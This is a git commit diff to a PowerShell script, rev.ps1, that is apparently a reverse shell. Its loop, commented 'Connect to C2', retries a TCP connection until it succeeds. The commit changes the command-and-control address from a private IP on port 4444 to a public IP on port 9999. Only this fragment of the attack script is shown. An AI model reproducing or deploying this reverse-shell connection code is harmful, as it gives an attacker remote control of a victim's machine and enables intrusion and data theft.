83850a7e67db0eb5dd476414f592aa26f1dcaa44
yannled <yannlederrey@gmail.com>
2025-03-11 13:13:11 +0100

    Update rev.ps1

--- rev.ps1
+++ rev.ps1
@@ -4,7 +4,7 @@ do {
 
     # Connect to C2
     try{
-        $TCPClient = New-Object Net.Sockets.TCPClient('10.153.83.147', 4444)
+        $TCPClient = New-Object Net.Sockets.TCPClient('31.10.231.212', 9999)
     } catch {}
 } until ($TCPClient.Connected)
 
